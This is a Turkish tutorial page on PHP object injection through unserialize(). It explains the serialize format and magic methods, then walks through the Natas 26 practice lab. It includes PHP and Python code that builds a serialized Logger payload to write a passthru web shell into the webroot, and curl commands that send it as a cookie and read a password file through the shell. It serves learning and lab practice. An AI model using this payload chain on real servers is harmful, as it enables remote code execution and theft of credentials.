# 🌐 Web Güvenliği — PHP Object Injection (Deserialization)

> PHP nesneleri serialize edip cookie'de saklayabilir.
> Eğer bu veriyi kontrol edebilirsen, sunucu istediğin nesneyi oluşturur.

---

## 📋 İçindekiler

- [Serialize / Unserialize Nedir?](#serialize--unserialize-nedir)
- [PHP Serialize Formatı](#php-serialize-formatı)
- [Magic Method'lar](#magic-methodlar)
- [Kötü Amaçlı Nesne Oluşturma](#kötü-amaçlı-nesne-oluşturma)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Serialize / Unserialize Nedir?

**Serialize:** PHP nesnesini veya dizisini saklanabilir/iletilebilir string'e dönüştürme.
**Unserialize:** Bu string'den orijinal nesneyi/diziyi geri oluşturma.

```php
$data = ["username" => "admin", "role" => "user"];
$str  = serialize($data);
// a:2:{s:8:"username";s:5:"admin";s:4:"role";s:4:"user";}

$back = unserialize($str);
// ["username" => "admin", "role" => "user"]
```

Web uygulamaları bunu cookie veya hidden input'ta kullanabilir.

---

## PHP Serialize Formatı

```
a:2:{...}           → array, 2 eleman
s:5:"admin"         → string, 5 karakter, "admin"
i:1                 → integer, 1
b:1                 → boolean, true (0=false, 1=true)
N                   → null
O:4:"User":2:{...}  → Object, sınıf adı 4 karakter "User", 2 property
```

### Örnek Nesne

```php
class Logger {
    public $filename = "log.txt";
    public $data     = "test";
}

$obj = new Logger();
echo serialize($obj);
// O:6:"Logger":2:{s:8:"filename";s:7:"log.txt";s:4:"data";s:4:"test";}
```

---

## Magic Method'lar

PHP'de bazı özel metodlar belirli olaylarda otomatik çağrılır:

| Method | Ne Zaman Çağrılır |
|--------|-------------------|
| `__construct()` | Nesne oluşturulduğunda |
| `__destruct()` | Nesne yok edildiğinde (script bitişinde) |
| `__wakeup()` | `unserialize()` sonrası |
| `__sleep()` | `serialize()` öncesi |
| `__toString()` | Nesne string'e dönüştürüldüğünde |

### Neden Tehlikeli?

`unserialize()` çağrıldığında:
1. String parse edilir, nesne oluşturulur
2. `__wakeup()` otomatik çağrılır
3. Script bitişinde `__destruct()` otomatik çağrılır

Eğer bu method'lar tehlikeli işlemler yapıyorsa (dosya yazma, komut çalıştırma), kötü amaçlı serialize string ile bu işlemler tetiklenebilir.

---

## Kötü Amaçlı Nesne Oluşturma

### Senaryo

```php
class Logger {
    private $logFile;
    private $exitMsg;

    public function __destruct() {
        // Script bitişinde log dosyasına exitMsg yaz
        file_put_contents($this->logFile, $this->exitMsg);
    }
}
```

`__destruct()` `file_put_contents` çağırıyor. Eğer `$logFile` ve `$exitMsg`'yi kontrol edebilirsek:

```php
$evil = new Logger();
$evil->logFile = "/var/www/html/shell.php";
$evil->exitMsg = "<?php passthru(\$_GET['cmd']); ?>";

echo serialize($evil);
// O:6:"Logger":2:{s:..:"logFile";s:23:"/var/www/html/shell.php";s:..:"exitMsg";s:32:"<?php passthru($_GET['cmd']); ?>";}
```

Bu string `unserialize()` edildiğinde script bitişinde shell.php oluşturulur.

---

## Natas'ta Kullanım

### Natas 26 — Logger Sınıfı ile RCE

**Kaynak kod (özet):**

```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file) {
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = $file;
    }

    function log($msg) {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $msg."\n");
        fclose($fd);
    }

    function __destruct() {
        $fd = fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);   // ← exitMsg dosyaya yazılıyor
        fclose($fd);
    }
}

// Cookie'den nesneyi restore et
if(array_key_exists("drawing", $_COOKIE)) {
    $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
}
```

**Exploit Adımları:**

**Adım 1: Kötü amaçlı Logger nesnesi oluştur**

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
}

$obj = new Logger();
// Private property'lere yansıma ile eriş
$obj_ref = new ReflectionClass($obj);

// Veya serialize string'i doğrudan oluştur:
$payload = 'O:6:"Logger":3:{s:15:"' . "\0Logger\0" . 'logFile";s:27:"/var/www/html/img/shell.php";s:15:"' . "\0Logger\0" . 'initMsg";s:0:"";s:15:"' . "\0Logger\0" . 'exitMsg";s:32:"<?php passthru($_GET[\'cmd\']); ?>";}';

echo base64_encode($payload);
```

Private property'lerin serialize formatı: `\0ClassName\0propertyName`

**Python ile payload oluşturma:**

```python
import base64

# Private property formatı: \x00ClassName\x00propertyName
log_file = "/var/www/html/img/shell.php"
exit_msg = "<?php passthru($_GET['cmd']); ?>"

payload = (
    'O:6:"Logger":3:{'
    + f's:{len(chr(0) + "Logger" + chr(0) + "logFile")}:"' + chr(0) + 'Logger' + chr(0) + 'logFile";'
    + f's:{len(log_file)}:"{log_file}";'
    + f's:{len(chr(0) + "Logger" + chr(0) + "initMsg")}:"' + chr(0) + 'Logger' + chr(0) + 'initMsg";s:0:"";'
    + f's:{len(chr(0) + "Logger" + chr(0) + "exitMsg")}:"' + chr(0) + 'Logger' + chr(0) + 'exitMsg";'
    + f's:{len(exit_msg)}:"{exit_msg}";'
    + '}'
)

print(base64.b64encode(payload.encode('latin-1')).decode())
```

**Adım 2: Cookie olarak gönder**

```bash
curl -u natas26:[şifre] \
     -b "drawing=[BASE64_PAYLOAD]" \
     "http://natas26.natas.labs.overthewire.org/"
```

**Adım 3: Oluşturulan shell'i çalıştır**

```bash
curl -u natas26:[şifre] \
     "http://natas26.natas.labs.overthewire.org/img/shell.php?cmd=cat+/etc/natas_webpass/natas27"
```

---

### Object Injection — Kontrol Listesi

```
Tespit:
  ☐ Cookie veya parametre Base64 → decode → O: ile başlıyor mu?
  ☐ Kaynak kodda unserialize() var mı?
  ☐ __destruct veya __wakeup tehlikeli işlem yapıyor mu?

Exploit:
  ☐ Sınıf tanımını kaynak koddan kopyala
  ☐ Tehlikeli property'leri ayarla (logFile, exitMsg)
  ☐ Serialize → Base64 encode → cookie olarak gönder
  ☐ Private property: \x00ClassName\x00propertyName
  ☐ Yüklenen dosyaya eriş → komut çalıştır
```

---

## 🔗 Kaynaklar

- [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP — Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [PHP — serialize()](https://www.php.net/manual/en/function.serialize.php)

---

**Önceki konu:** [17_php_type_juggling.md](./17_php_type_juggling.md)
**Sonraki konu:** [19_sql_truncation.md](./19_sql_truncation.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
